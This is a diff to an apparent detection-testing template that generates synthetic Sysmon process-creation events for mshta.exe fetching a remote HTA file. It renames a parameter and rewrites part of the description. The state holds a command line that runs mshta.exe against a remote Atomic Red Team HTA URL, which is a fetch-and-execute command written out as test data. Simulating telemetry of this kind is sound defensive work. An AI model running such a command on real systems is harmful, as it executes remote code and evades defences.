@@ -4,9 +4,10 @@ description: |
   with a URL in its command line. Sysmon EID 1 (Process Create) records
   the launch with the full CommandLine. Attackers use mshta.exe to fetch
   and execute a remote HTA file over HTTP/HTTPS, bypassing controls that
-  only monitor browser-based downloads. The URL is a state parameter so
-  a job can drive both a remote fetch and a local, non-network HTA open
-  that should not trip a detection scoped to http/https URLs.
+  only monitor browser-based downloads. The HTA target (a URL or a local
+  path) is a state parameter so a job can drive both a remote fetch and
+  a local, non-network HTA open that should not trip a detection scoped
+  to http/https URLs.
 tags: [eid1]
 mitre:
   tactics: [defense-evasion]
@@ -33,8 +34,8 @@ state:
   username:            gen.username()
   user:                "${ref.domain_short}\\${ref.username}"
   event_record_id:     gen.int(min=5000, max=9999999)
-  url:                 "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta"
-  command_line:        "\"C:\\Windows\\system32\\mshta.exe\" \"${ref.url}\""
+  hta_target:          "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta"
+  command_line:        "\"C:\\Windows\\system32\\mshta.exe\" \"${ref.hta_target}\""
   current_directory:   "C:\\Windows\\system32\\"
   parent_image:        "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe"
   parent_command_line: "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding"
